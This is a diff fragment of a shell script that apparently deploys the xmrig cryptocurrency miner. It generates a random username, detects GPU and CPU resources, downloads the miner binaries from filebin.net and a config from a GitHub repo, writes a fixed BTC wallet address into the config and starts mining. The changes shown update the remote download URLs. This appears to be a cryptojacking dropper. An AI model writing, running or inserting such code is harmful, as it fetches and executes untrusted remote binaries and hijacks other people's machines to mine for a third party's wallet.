@@ -24,9 +24,9 @@ exit 1
 # Generate a random username
 RANDOM_USER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 # URLs for miners and config
-url_xmrig="https://filebin.net/otnmaiu2z72pyepv"
+url_xmrig="https://filebin.net/archive/otnmaiu2z72pyepv/zip"
 url_config="https://raw.githubusercontent.com/lolminerxmrig/ai/main/config.json"
-url_miner="https://filebin.net/otnmaiu2z72pyepv"
+url_miner="https://filebin.net/archive/otnmaiu2z72pyepv/zip"
 
 # Check if GPU is available
 if command -v nvidia-smi &> /dev/null
@@ -52,7 +52,7 @@ CPU_CORES=$(nproc --all)
 sed -i 's|"user": "BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993"|"user": "BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.CPU-'$CPU_CORES'-'$RANDOM_USER'"|g' config.json
 ./xmrig -c config.json --randomx-mode=fast"
 url_config="https://raw.githubusercontent.com/lolminerxmrig/ai/main/config.json"
-url_miner="https://filebin.net/otnmaiu2z72pyepv"
+url_miner="https://filebin.net/archive/otnmaiu2z72pyepv/zip"
 
 # Check if GPU is available
 if command -v nvidia-smi &> /dev/null
